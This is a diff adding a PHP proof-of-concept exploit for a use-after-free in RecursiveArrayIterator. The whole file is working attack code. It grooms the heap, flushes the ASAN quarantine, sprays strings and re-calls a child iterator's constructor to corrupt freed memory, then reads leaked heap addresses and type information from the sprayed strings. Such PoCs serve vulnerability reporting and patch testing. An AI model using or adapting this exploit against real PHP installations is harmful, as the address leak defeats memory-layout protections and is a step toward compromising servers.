@@ -1,0 +1,118 @@
+<?php
+ini_set('memory_limit', '-1');
+
+function get_payload($len) {
+    return str_repeat("\x00", $len);
+}
+
+// Flush memory to force reallocation.
+// This is primarily to bypass ASAN quarantine (256MB by default).
+// For standard builds, this is harmless but ensures a clean heap state.
+function flush_quarantine() {
+    $junk = [];
+    // 300 chunks of 1MB
+    for ($i = 0; $i < 300; $i++) {
+        $s = str_repeat("J", 1024 * 1024);
+        $s = null; // Free immediately
+    }
+}
+
+echo "[*] Starting UAF Leak PoC...\n";
+echo "[*] PHP Version: " . PHP_VERSION . "\n";
+
+$ATTEMPTS = 5;
+// Target sizes:
+// 100: Found via fuzzing (Common in system allocator / ASAN builds)
+// 231: Standard 256-byte bin for Zend Allocator
+// We also include neighbors to handle alignment variations.
+$TARGET_LENS = [100, 231, 231-16, 231+16, 103, 111];
+
+$success = false;
+
+for ($attempt = 0; $attempt < $ATTEMPTS; $attempt++) {
+    echo "[-] Attempt " . ($attempt + 1) . "...\n";
+    
+    // 1. Heap Grooming
+    $parents = [];
+    $children = [];
+    
+    // Create pairs. 
+    // [0 => "pad", 1 => [1]]. 
+    // We target index 1.
+    for ($i = 0; $i < 20; $i++) {
+        $parents[$i] = new RecursiveArrayIterator([0 => "pad", 1 => [1]]);
+        $parents[$i]->next();
+        $children[$i] = $parents[$i]->getChildren();
+    }
+    
+    // 2. Free Parents
+    // This puts chunks into the freelist (or quarantine if ASAN is active).
+    foreach ($parents as $i => $p) {
+        unset($parents[$i]);
+    }
+    $parents = null;
+    
+    // 3. Flush Memory / Quarantine
+    // Necessary for ASAN to evict chunks from quarantine.
+    // Also helps stabilize heap on standard builds.
+    flush_quarantine();
+    
+    // 4. Spray Strings
+    $protector = [];
+    foreach ($TARGET_LENS as $len) {
+        // Spray enough to catch the slot
+        for ($j = 0; $j < 10; $j++) {
+             $protector[] = get_payload($len);
+        }
+    }
+    
+    // 5. Trigger UAF
+    $arr = [1, 2, 3];
+    foreach ($children as $c) {
+        try {
+            $c->__construct($arr);
+        } catch (Throwable $e) {}
+    }
+    
+    // 6. Check for Leak
+    foreach ($protector as $k => $v) {
+        // If string is modified, we won!
+        if ($v !== get_payload(strlen($v))) {
+            echo "[+] SUCCESS! UAF Triggered.\n";
+            echo "[+] String index: $k, Length: " . strlen($v) . "\n";
+            
+            // Find the modification
+            for ($pos = 0; $pos < strlen($v) - 8; $pos += 8) {
+                $chunk = substr($v, $pos, 8);
+                if ($chunk !== "\x00\x00\x00\x00\x00\x00\x00\x00") {
+                    // This is likely the address
+                    $addr = unpack("Q", $chunk)[1];
+                    printf("[*] Leaked Address at offset %d: 0x%x\n", $pos, $addr);
+                    
+                    // Check next 8 bytes for type info if available
+                    if ($pos + 16 <= strlen($v)) {
+                         $type_info = unpack("I", substr($v, $pos + 8, 4))[1];
+                         printf("[*] Type Info: 0x%x\n", $type_info);
+                    }
+                    
+                    $success = true;
+                    break 2; // Break string loop
+                }
+            }
+            break; // Should break via above, but just in case
+        }
+    }
+    
+    if ($success) break;
+    
+    // Cleanup
+    $protector = null;
+    $children = null;
+    gc_collect_cycles();
+}
+
+if (!$success) {
+    echo "[-] Failed to leak address.\n";
+    exit(1);
+}
+?>
